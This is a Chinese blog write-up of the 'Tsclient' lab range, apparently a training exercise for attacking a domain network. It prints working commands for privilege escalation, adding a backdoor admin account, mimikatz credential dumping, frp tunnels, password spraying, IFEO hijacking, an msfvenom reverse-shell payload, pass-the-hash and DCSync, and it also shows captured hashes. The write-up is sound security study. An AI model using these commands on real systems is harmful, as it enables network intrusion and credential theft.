<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    <meta name="baidu-site-verification" content="codeva-saNLerbgqp" />
    <meta name="keywords" content="春秋云镜Tsclient, 清风的博客">
    <meta name="description" content="Tsclient过程遇到的问题：
1.拿到html如何横向
2.内网代理，如何通过远程172的内网代理到我本地192的内网，拓扑：
            172.22.8.46												 192.168.120.128（Ka">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>春秋云镜Tsclient | 清风的博客</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 6.3.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">清风的博客</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories/CTF" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA" class="waves-effect waves-light">
      
      <i class="fas fa-user-friends" style="zoom: 0.6;"></i>
      
      <span>友人铺</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">清风的博客</div>
        <div class="logo-desc">
            
            勤奋总有回报
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories/CTF" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-friends"></i>
			
			友人铺
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">春秋云镜Tsclient</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                          <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                          </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
                                渗透
                            </a>
                        
                            <a href="/categories/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA/" class="post-category">
                                靶机
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-10-22
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2023-10-31
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    2.9k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    12 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="Tsclient"><a href="#Tsclient" class="headerlink" title="Tsclient"></a>Tsclient</h1><p>过程遇到的问题：</p>
<pre class=" language-xml"><code class="language-xml">1.拿到html如何横向
2.内网代理，如何通过远程172的内网代理到我本地192的内网，拓扑：
            172.22.8.46												 192.168.120.128（Kali）
                ↓															↑
            172.22.8.18(39.99.224.53)----->123.249.8.26(CS)---------->192.168.120.1
3.远程内网172.22.8.46不出网，如何上线CS
</code></pre>
<p>Fscan扫描：</p>
<p>​<img src="/Blogimages/Tsclient/image-20230823081434-rjdwvd5.png" alt="image">​</p>
<p>扫到一个数据库密码，连接：</p>
<p>​<img src="/Blogimages/Tsclient/image-20230823081419-au23h2i.png" alt="image">​</p>
<p>甜土豆提权执行命令：</p>
<p>​<img src="/Blogimages/Tsclient/image-20230823083645-0khndbc.png" alt="image">​</p>
<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>新建用户：</p>
<pre class=" language-bash"><code class="language-bash">C:/ProgramData/SweetPotato.exe -a <span class="token string">"net user qingfeng qwer1234! /add"</span>
C:/ProgramData/SweetPotato.exe -a <span class="token string">"net localgroup administrators qingfeng /add"</span>
C:/ProgramData/SweetPotato.exe -a <span class="token string">'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'</span>
</code></pre>
<p>登录远程桌面拿到第一个flag</p>
<p>这里由于远程桌面版本好像比较低，用rdesktop是无法连接成功的，所以使用apt install remmina下载remmina</p>
<p>使用remmina即可忽略版本问题</p>
<p>​<img src="/Blogimages/Tsclient/image-20230823084104-apoi8b8.png" alt="image">​</p>
<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>上个猕猴桃看能不能抓到密码：</p>
<pre class=" language-bash"><code class="language-bash">log
privilege::debug
sekurlsa::logonpasswords
</code></pre>
<pre class=" language-xml"><code class="language-xml">
Authentication Id : 0 ; 661009 (00000000:000a1611)
Session           : RemoteInteractive from 2
User Name         : John
Domain            : WIN-WEB
Logon Server      : WIN-WEB
Logon Time        : 2023/8/23 8:12:39
SID               : S-1-5-21-4088072006-1921831747-1237773115-1008
    msv :
     [00000003] Primary
     * Username : John
     * Domain   : WIN-WEB
     * NTLM     : eec9381b043f098b011be51622282027
     * SHA1     : 18056c7dda082b2b219dbaac6157a1fb234403bc
    tspkg :
    wdigest :
     * Username : John
     * Domain   : WIN-WEB
     * Password : (null)
    kerberos :
     * Username : John
     * Domain   : WIN-WEB
     * Password : (null)
    ssp :
    credman :
</code></pre>
<p>抓到了John账号的NTLM</p>
<p>内网先fscan扫一下：</p>
<pre class=" language-xml"><code class="language-xml">C:\Windows\Temp>fscan.exe -h 172.22.8.18/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.7.1
start infoscan
[*] 已完成 0/0 listen ip4:icmp 0.0.0.0: socket: An attempt was made to access a socket in a way forbidden by its access permissions.
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.8.31     is alive
(icmp) Target 172.22.8.15     is alive
(icmp) Target 172.22.8.18     is alive
(icmp) Target 172.22.8.46     is alive
[*] Icmp alive hosts len is: 4
172.22.8.15:88 open
172.22.8.31:445 open
172.22.8.46:445 open
172.22.8.18:1433 open
172.22.8.15:445 open
172.22.8.46:139 open
172.22.8.18:445 open
172.22.8.15:139 open
172.22.8.18:139 open
172.22.8.31:139 open
172.22.8.31:135 open
172.22.8.18:135 open
172.22.8.46:135 open
172.22.8.15:135 open
172.22.8.46:80 open
172.22.8.18:80 open
[*] alive ports len is: 16
[*] start vulscan
[+] NetInfo:
[*]172.22.8.18
   [->]WIN-WEB
   [->]172.22.8.18
   [->]2001:0:348b:fb58:1cb7:3b8e:d89d:8985
[+] NetInfo:
[*]172.22.8.46
   [->]WIN2016
   [->]172.22.8.46
[+] NetInfo:
[*]172.22.8.15
   [->]DC01
   [->]172.22.8.15
[+] NetInfo:
[*]172.22.8.31
   [->]WIN19-CLIENT
   [->]172.22.8.31
[*] 172.22.8.31          XIAORANG\WIN19-CLIENT
[*] 172.22.8.15    [+]DC XIAORANG\DC01
[*] 172.22.8.46          XIAORANG\WIN2016           Windows Server 2016 Datacenter 14393
[*] WebTitle:http://172.22.8.18        code:200 len:703    title:IIS Windows Server
[*] WebTitle:http://172.22.8.46        code:200 len:703    title:IIS Windows Server
[+] mssql:172.22.8.18:1433:sa 1qaz!QAZ
[*] 已完成 16/16
[*] 扫描结束,耗时: 11.0592205s
</code></pre>
<p>现在发现三台域内主机：</p>
<pre class=" language-xml"><code class="language-xml">[*] 172.22.8.31          XIAORANG\WIN19-CLIENT
[*] 172.22.8.15    	[+]DC XIAORANG\DC01
[*] 172.22.8.46          XIAORANG\WIN2016
</code></pre>
<p>我们已经有控制权的是172.22.8.18</p>
<p>现在想要横向怎么办？</p>
<p>我们刚才创建的账号qingfeng肯定是和域内主机没有联系的</p>
<p>而且其他主机也没有什么可以打的web服务，只有一个默认的IIS，也扫不出来ms17-010</p>
<p>只能从john账号入手</p>
<p>先上线：</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021162903-9pyueq9.png" alt="image">​</p>
<p>我们注入一个john进程：</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021161735-iclmmei.png" alt="image">​</p>
<p>上线一个新的用户：</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021163048-nhcmbrp.png" alt="image">​</p>
<p>使用<code>shell net use</code>​</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021163119-uobga3l.png" alt="image">​</p>
<p>发现他有一个连接</p>
<p>拿文件：</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021163241-4kf8zof.png" alt="image">​</p>
<p>发现有一个密码账号（这里还有一个提示没看见。。。，原话是：</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021211601-tx461b7.png" alt="image">​</p>
<p>而且是在域内的，我们挂个代理进去看看：</p>
<p>frpc配置文件如下：</p>
<pre class=" language-xml"><code class="language-xml">[common]
server_addr = vps_ip
server_port = 7000
token = xxxx


[proxy]
type = tcp
plugin = socks5
remote_port = 25599
</code></pre>
<p>frps配置文件如下：</p>
<pre class=" language-xml"><code class="language-xml">[common]
## 一、服务器的基本配置部分
## 7000 是FRP服务端口，可以改
bind_port = 7000
## dashboard_user和dashboard_pwd是FRP网页版管理员用户名密码，可以改。
dashboard_user = admin
dashboard_pwd = xxxx
## 7500 是网页版管理端口：可以通过 http://服务器ip:7500登陆
dashboard_port = 25500
## 服务器和客户机之间的心跳连接
heartbeat_timeout = 30
#token设置，需要和客户端一致，客户端与服务端通过token进行认证，建议满足复杂度要求
token=xxxx
</code></pre>
<p>修改Klai的proxychains配置文件</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021163847-e3djmvt.png" alt="image">​</p>
<p>访问确认代理可以使用</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021163825-jt2p8i5.png" alt="image">​  </p>
<p>关于代理更细的代理都写在<a href="http://qingfeng.tech/2023/06/06/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/">内网代理 | 清风的博客 (qingfeng.tech)</a></p>
<p>利用密码喷洒探测内网可以使用该密码登录的主机：</p>
<pre class=" language-shell"><code class="language-shell">proxychains -q crackmapexec smb 172.22.8.0/24 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#'
</code></pre>
<p>​<img src="/Blogimages/Tsclient/image-20231021164123-1jzpvai.png" alt="image">​</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021164105-6gmmso7.png" alt="image"></p>
<p>提示密码状态已过期</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021165206-l4ni1h8.png" alt="image">​</p>
<p>重置密码，31，15，46三台机子只有15可以重置成功</p>
<p>但是奇怪的是15无法登录，但是46却可以登录，而且也是修改完密码的。表示不解..</p>
<p>现在利用rdp登录：</p>
<pre class=" language-shell"><code class="language-shell">proxychains rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p 'qwer1234!'
proxychains rdesktop 172.22.8.15 -u Aldrich -d xiaorang.lab -p 'qwer1234!'
proxychains rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p 'qwer1234!' -r disk:Linuxictures=/home/kali/Desktop  
# 只有这个46可以登录成功  -r 是因为为了后续方便传输文件，挂载了一个虚拟磁盘名为Linuxictures，在RDP的资源管理器中可以看见
</code></pre>
<p>现在的46就是一个普通用户，想要flag必须提权到Administrator权限以上</p>
<p>这里就利用到了上面的提示</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021211935-ejhcsfc.png" alt="image">​</p>
<p>​<code>你知道映像劫持吗？</code>​</p>
<p>Image File Execution Options（IFEO）是映像劫持的英文，就是在执行某个程序时拦截并执行自己定义的程序。</p>
<p>配合后门持久化,可以实现系统在未登录状态下，通过快捷键运行自己的程序。（比如按5下shift出现的粘滞键Sethc.exe，还有Windows + U组合键时启动的utilman.exe程序）</p>
<p>更多如下</p>
<ul>
<li>屏幕键盘： C:\Windows\System32\osk.exe</li>
<li>放大镜： C:\Windows\System32\Magnify.exe</li>
<li>旁白： C:\Windows\System32\Narrator.exe</li>
<li>显示切换器 C:\Windows\System32\DisplaySwitch.exe</li>
</ul>
<p>打开Powershell输入命令可以看是否存在这个漏洞：</p>
<p>​<code>get-acl -path &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot; | fl *</code>​</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021213145-m37y3vh.png" alt="image">​</p>
<pre class=" language-xml"><code class="language-xml">1. NT AUTHORITY\Authenticated Users Allow SetValue,CreateSubKey,ReadKey: 这个规则允许"Authenticated Users"用户组执行 "SetValue" 和 "CreateSubKey" 操作，这两个操作都可以用来修改注册表的内容。
2. APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow SetValue,CreateSubKey,ReadKey: 这个规则允许"ALL APPLICATION PACKAGES"权限组执行 "SetValue" 和 "CreateSubKey" 操作，同样，这两个操作都可以用来修改注册表。

这意味着任何已认证的用户（"Authenticated Users"）和所有应用程序包权限组（"ALL APPLICATION PACKAGES"）的成员都可以对注册表进行修改，包括添加、修改和删除注册表键和值。
</code></pre>
<p>所以我们可以通过普通用户修改注册表：</p>
<pre class=" language-xml"><code class="language-xml">REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
</code></pre>
<p>修改成功后，锁定用户，右下角点击放大镜。弹出cmd表示成功劫持，读取flag即可</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021190943-2aup7jo.png" alt="image">​</p>
<p>‍</p>
<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>接下来就是考虑如何拿到域控了</p>
<p>先上线我们上面提权到的机器（Administrator执行上线）</p>
<p>‍</p>
<p>这里上线的时候有个问题，这台机器是不出网的</p>
<p>想要上线CS，必须通过入口机作为跳板</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021215545-nznv0tu.png" alt="image">​</p>
<p>入口机器选择这个Lintener作为中转机</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021215621-2o9yef0.png" alt="image">​</p>
<p>这里就是建立了一个监听</p>
<p>再选择木马：</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021215707-vg5mor7.png" alt="image">​</p>
<p>这里是Stageless木马才能选中Lintener监听</p>
<p>之后执行即可上线</p>
<p>这里还有另一个问题，因为我vps上面没有MSF，如果想要上线我Kali的MSF应该怎么做（上线MSF为了提权，虽然没提上）</p>
<p>就是上面说到的问题：</p>
<p>​​<img src="/Blogimages/Tsclient/image-20231021220617-ds2qjtj.png" alt="image">​​</p>
<p>毫无疑问我们是利用线路1</p>
<p>首先需要以39.99.224.53作为FRPS</p>
<p>frps.ini如下：</p>
<pre class=" language-xml"><code class="language-xml">[common]
bind_port = 7001
token=frpToken@admin2022
</code></pre>
<p>kali作为frpc</p>
<p>frpc.ini如下:</p>
<pre class=" language-xml"><code class="language-xml">[common]
server_addr = 39.99.224.53
server_port = 7001
token = frpToken@admin2022

[proxy]
type = tcp
local_ip = 192.168.120.128
local_port = 9999
remote_port = 9999
</code></pre>
<p>接下来的问题就是生成木马了</p>
<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.8.18  LPORT=9999 -f exe > muma.exe
</code></pre>
<p>这里为什么选择LHOST&#x3D;172.22.8.18呢？</p>
<p>因为我们使用frp已经把172.22.8.18（39.99.224.53）的9999端口转发到kali的9999端口了，并且172.22.8.46只能访问到172.22.8.18（39.99.224.53）的9999端口</p>
<p>所以就相当于我们msf的9999端口就在172.22.8.18（39.99.224.53）的9999端口</p>
<p>但是上线MSF仍然没有可以利用的提权…</p>
<p>回到flag3</p>
<p>这台主机已经是在域内了，所以我们可以直接看域内的管理员用户</p>
<p>​<code>shell net group &quot;domain admins&quot; /domain</code>​</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021213551-7wmwwkm.png" alt="image">​</p>
<p>可以看到这里有两个用户：</p>
<pre class=" language-xml"><code class="language-xml">Administrator
Win2016$(机器用户)
</code></pre>
<p>Administrator是DC上的账户，我们没有权限直接抓到他</p>
<p>‍</p>
<p>但是我们可以抓到WIN2016的NTLM：</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021214720-9wfcf14.png" alt="image">​</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021191911-8advxds.png" alt="image">​</p>
<p>利用这个NTLM：</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021214528-1dk7xrg.png" alt="image">​</p>
<p>首先提到<code>WIN2016</code>​的权限</p>
<p>然后抓取Administrator的NTLM值：</p>
<p>​<code>mimikatz lsadump::dcsync /domain:xiaorang.lab /all /csv exit</code>​</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021214927-0tt5j6y.png" alt="image">​</p>
<p>再次利用Administrator的NTLM建立连接</p>
<p>先切换任务视图</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021215025-lr4naan.png" alt="image"></p>
<p>再选择64位的pkexec横向：</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021215115-ly09kda.png" alt="image">​</p>
<p>选择好使用的hash值</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021215149-3yevwo8.png" alt="image">​</p>
<p>再确定好Listener和Session，成功后会返回一个标识</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021215231-li4861l.png" alt="image">​</p>
<p>再利用<code>dcsync</code>​抓到<code>Administrator</code>​的账号</p>
<p>读取flag</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021211111-1z28wol.png" alt="image"></p>
<p>关于这里的<code>dcsync</code>​也有必要说一下</p>
<blockquote>
<h3 id="DCSync攻击"><a href="#DCSync攻击" class="headerlink" title="DCSync攻击"></a>DCSync攻击</h3><p><strong>一个域环境内可以拥有多台域控制器，每个域控制器各自存储着一份所在域的活动目录的可写副本，对目录的任何修改都可以从源控制器同步到本域、域树和域林中的其他域控制器上，当一个域控想从另一个域控获取域数据更新时，客户端域控会向服务端域控发送DSGetNCChanges请求，该请求的响应将包含客户段域控必须应用到其活动目录副本的一组更新。通常情况下，域控制器之间每15分组就会有一次域数据同步。</strong></p>
<p><strong>DCSync技术就是利用域控制器同步的原理，通过Directory Replication Service(DRS)服务的IDL_DRSGetNCChanges接口向域控发起数据通过请求。在DCSync出现前，要获得所有域用户的哈希，测试人员可能需要登录域控制器或通过卷影拷贝技术获取NTDS.dit文件。利用DCSync，测试人员可以在域内任何一台机器上模拟一个域控制器，通过域数据同步复制的方式获取正在运行的合法域控制器上的数据。注意，DCSync攻击不适用于只读域控制器（RODC）。</strong></p>
<p><strong>在默认情况下，只有Administrator，Domain Controllers和Enterprise Domain Admins组内的用户和域控制器的机器账户才有执行DCSync操作的权限。</strong></p>
<p>‍</p>
<p><strong>一般来说，域管理员权限的用户以及Krbtgt用户的哈希是有价值的。通过域管理员的哈希可以直接获取服务器控制权，而Krbtgt用户的哈希可以用来制作黄金票据，实现票据传递攻击。拿到域控权限导出全部hash，就可以直接PTH攻击域内所有机器了。</strong></p>
<pre><code>                                                            --  xiaoqiuxx
</code></pre>
</blockquote>
<p>实现途径：</p>
<h4 id="猕猴桃"><a href="#猕猴桃" class="headerlink" title="猕猴桃"></a>猕猴桃</h4><pre class=" language-xml"><code class="language-xml"># 导出域内指定用户的信息(包括哈希值)
mimikatz.exe "lsadump::dcsync /domain:whoamianony.org /user:administrator" exit
mimikatz.exe "lsadump::dcsync /domain:whoamianony.org /user:administrator /csv" exit

# 导出域内所有用户的信息(包括哈希值)
mimikatz.exe "lsadump::dcsync /domain:whoamianony.org /all" exit
mimikatz.exe "lsadump::dcsync /domain:whoamianony.org /all /csv" exit
</code></pre>
<h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><pre class=" language-xml"><code class="language-xml">#导出域管理员Administrator用户的哈希值
python3 secretsdump.py whoamianony/administrator:Whoami2021@192.168.93.30 -dc-ip 192.168.93.30 -just-dc-user administrator    # 获取 administrator 用户的哈希
# python3 secretsdump.py domain/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span> <span class="token attr-name">for</span> <span class="token attr-name">DCSync</span><span class="token punctuation">></span></span>:password@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dc-ip</span><span class="token punctuation">></span></span> -dc-ip <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dc-ip</span><span class="token punctuation">></span></span> -just-dc-user <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span> <span class="token attr-name">for</span> <span class="token attr-name">DCSync</span><span class="token punctuation">></span></span>
</code></pre>
<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><pre class=" language-xml"><code class="language-xml">Import-Module .\Invoke-DCSync.ps1
​
# 导出域内所有用户的哈希值
Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize
​
# 导出域内指定用户的哈希值
Invoke-DCSync -DumpForest | ft -wrap -autosize
</code></pre>
<p>‍</p>
<p>最终的结果图：</p>
<p>​<img src="/Blogimages/Tsclient/image-20231021230102-0shmu2m.png" alt="image">​</p>

                
            </div>
            <hr/>

            



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
